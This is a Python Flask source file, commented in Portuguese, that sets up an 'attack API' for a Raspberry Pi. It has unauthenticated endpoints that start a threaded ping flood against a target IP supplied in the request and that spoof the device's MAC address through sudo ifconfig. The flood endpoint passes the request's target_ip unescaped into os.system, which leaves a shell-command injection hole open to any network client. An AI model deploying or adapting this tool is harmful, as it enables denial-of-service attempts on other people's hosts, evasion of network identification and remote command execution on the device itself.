# --- API de ataques para o Raspberry Pi 3 ---

from flask import Flask, request, jsonify
import threading
import time
import os
import random
import subprocess

attack_app = Flask(__name__)

attacking = False
attack_thread = None

# --- Flood por Ping ---
def ping_flood(target_ip):
    while attacking:
        os.system(f"ping -c 1 {target_ip} > /dev/null")
        time.sleep(0.1)  # Ajuste para intensidade

@attack_app.route('/attack/ping_flood', methods=['POST'])
def start_ping_flood():
    global attacking, attack_thread
    target_ip = request.json.get('target_ip')
    if not target_ip:
        return jsonify({"error": "target_ip ausente"}), 400

    if attacking:
        return jsonify({"status": "Já atacando"})

    attacking = True
    attack_thread = threading.Thread(target=ping_flood, args=(target_ip,))
    attack_thread.start()
    return jsonify({"status": "Ataque iniciado"})

@attack_app.route('/attack/stop', methods=['POST'])
def stop_attack():
    global attacking
    attacking = False
    return jsonify({"status": "Ataque interrompido"})

@attack_app.route('/attack/spoof_mac', methods=['POST'])
def spoof_mac():
    iface = request.json.get('iface', 'wlan0')
    new_mac = f"02:00:00:{random.randint(0x00, 0xFF):02x}:{random.randint(0x00, 0xFF):02x}:{random.randint(0x00, 0xFF):02x}"
    try:
        subprocess.run(["sudo", "ifconfig", iface, "down"])
        subprocess.run(["sudo", "ifconfig", iface, "hw", "ether", new_mac])
        subprocess.run(["sudo", "ifconfig", iface, "up"])
        return jsonify({"status": "MAC spoofado com sucesso", "new_mac": new_mac})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    attack_app.run(host='0.0.0.0', port=7000)